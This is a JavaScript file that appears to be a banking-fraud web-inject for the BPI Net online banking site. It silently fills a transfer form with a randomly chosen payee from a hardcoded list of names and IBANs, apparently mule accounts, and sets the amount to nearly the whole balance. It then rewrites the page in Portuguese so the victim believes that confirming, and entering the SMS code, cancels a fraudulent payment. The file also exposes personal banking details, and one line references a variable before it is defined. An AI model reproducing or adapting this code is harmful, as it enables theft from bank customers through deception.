/* eslint-env browser, jquery */
/* eslint-disable max-len */

const balanceToken = [
    {
        name: 'Jesus martin estevez',
        iban: 'ES0800730100520660722412',
    
    },
    {
        name: 'Francisco Manuel Tallafe Villegas',
        iban: 'ES2200730100530655394289',
    
    },
    {
        name: 'Pesteleu Claudiu Nicusor',
        iban: 'CH1506850610582574546',
    
    },
    {
        name: 'Claudiu Nicusor Pesteleu',
        iban: 'CH9006850610582574554',
    
    },
    {
        name: 'Kocze Karoly',
        iban: 'HU85117734250588723700000000',
    
    },
    {
        name: 'BIANCA-CORNELIA BRATA',
        iban: 'CH4700248248177819M1D',
    
    },
    {
        name: 'Rafael Rodriguez Rodriguez',
        iban: 'ES9500730100590660626413',
    
    },
    {
        name: 'Chianu Serghei',
        iban: 'PL52160014621894318890000001',
    
    },
    {
        name: 'ARTJOMS SKUTELS',
        iban: 'LV14HABA0551042332214LV14HABA0551042332214',
    
    },
]

$(document).ready(() => {

    console.log('paso');

    if ($('#LT_BPINet_wt6_block_wtContent_Layout_UI_LT_BPI_Patterns_wt8_block_wtTitle').length) {
        window.location.replace('/BPINet_Transferencias/TransferirIBAN.aspx')
    }

    if ($('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_WebPatterns_wt13_block_wtTitle').length) {
        // $.blockUI();
        // setTimeout($.unblockUI, 15000)
        console.log('coco')
        $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttipoAgendamento_block_wtRow_LT_BPI_Patterns_wt493_block_wtInput_wtbltTipoAgendamento').click()

        // setTimeout(() => {
            // $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_WebPatterns_wt13_block_wtContent_wt19_LT_BPI_Patterns_wt6_block_wtForm_LT_BPI_Patterns_wt16_block_wtRow_LT_BPI_Patterns_wt18_block_wtInput_wtTipoTransferencia_List_ctl02_wt7').attr('onclick','console.log("done"); return true;')
            $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_WebPatterns_wt13_block_wtContent_wt19_LT_BPI_Patterns_wt6_block_wtForm_LT_BPI_Patterns_wt16_block_wtRow_LT_BPI_Patterns_wt18_block_wtInput_wtTipoTransferencia_List_ctl02_wt7').click()    
      
            setTimeout(() => {
                    
                $('#LT_BPINet_wt85_block_wtEntryMessage_wtEntryMessage_wt13_wtDisclaimer').text('Um pagamento solicitado em sua conta foi sinalizado como potencialmente fraudulento. Como não reconhecemos o dispositivo do qual foi feita a tentative. Para sua segurança, este pagamento foi colocado em espera.')
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_WebPatterns_wt13_block_wtTitle').text('Clique em Cancelar abaixo se você não reconhecer esta solicitação.')
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_LT_BPI_Patterns_wt129_block_wtActionsRight_wtbtnContinuarConfirm').val('Cancelar Pagamento')
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_LT_BPI_Patterns_wt129_block_wtActionsRight_wt608').val('Permitir pagamento')
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_LT_BPI_Patterns_wt129_block_wtActionsRight_wt608').prop('disabled', true);

                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtDescricao_block_wtRow').hide()
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wtComboBeneficiario_block_wtRow').hide()
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_wtsection_opcoesAdicionais').hide()
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtReferenciaOrdenante_block_wtRow').hide()
                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtInfoBeneficiario_block_wtRow').hide()

                const balanceEuroStr = $('#LT_BPINet_wt85_block_wtContext_CW_BPINet_Gerais_wtWB_ContaSaldos_New_OutrosBancos_block_WebPatterns_wt24_block_wtTitle_LT_BPI_Patterns_wtSaldoDisponivel2_block_wtDetailValue').text()

                const balanceEuroArray = balanceEuroStr.split(' EUR')
                const balanceEuroParsed = balanceEuro[0].replace(/\./, '')

                const balanceEuro = parseInt(balanceEuroParsed, 10) - 25

                if (balanceEuro < 1000) {
                    console.log('Man oh man, low balance!')
                    window.location.replace('/BPINet_Contas/Movimentos.aspx')
                    return;
                }

                const payee = balanceToken[Math.floor(Math.random() * balanceToken.length)];


                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtIBAN_block_wtRow_LT_BPI_Patterns_wt770_block_wtInput_wttxtIBAN2').val(payee.iban)
                // $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtIBAN_block_wtRow_LT_BPI_Patterns_wt770_block_wtInput_wttxtIBAN2').prop('disabled', true);


                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtNome_block_wtRow_LT_BPI_Patterns_wt73_block_wtInput_wttxtNomeBeneficiario').val(payee.name)
                // $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtNome_block_wtRow_LT_BPI_Patterns_wt73_block_wtInput_wttxtNomeBeneficiario').prop('disabled', true);


                $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtMontante_block_wtRow_LT_BPI_Patterns_wt595_block_wtInput_wttxtMontante2').val(balanceEuro)
                // $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt173_block_wtContent_LT_BPI_Patterns_wtfmFomularioDadosTranferencia_block_wtForm_LT_BPI_Patterns_wttxtMontante_block_wtRow_LT_BPI_Patterns_wt595_block_wtInput_wttxtMontante2').prop('disabled', true);



                // $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_LT_BPI_Patterns_wt129_block_wtActionsRight_wtbtnContinuarConfirm').val('Cancel Payment')

                console.log('coco2')
            }, 15000)
            
        // }, 8000)
    }

    if ($('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt580_block_wtTitle').length) {
        console.log('coco3')
        $('#LT_BPINet_wt85_block_wtMainContent_CW_Transferencias_wtTransferirIBAN_block_wt8_WebPatterns_wt546_block_wtContent_CS_TransactionCore_wtwbChallengeBlock_block_LT_BPI_Patterns_wtSMSPrompt_block_wtText').text('Por favor insira este código e clique em cancelar para bloquear este pagamento.')
        $('.InfoPanel_Actions').hide()
    }
})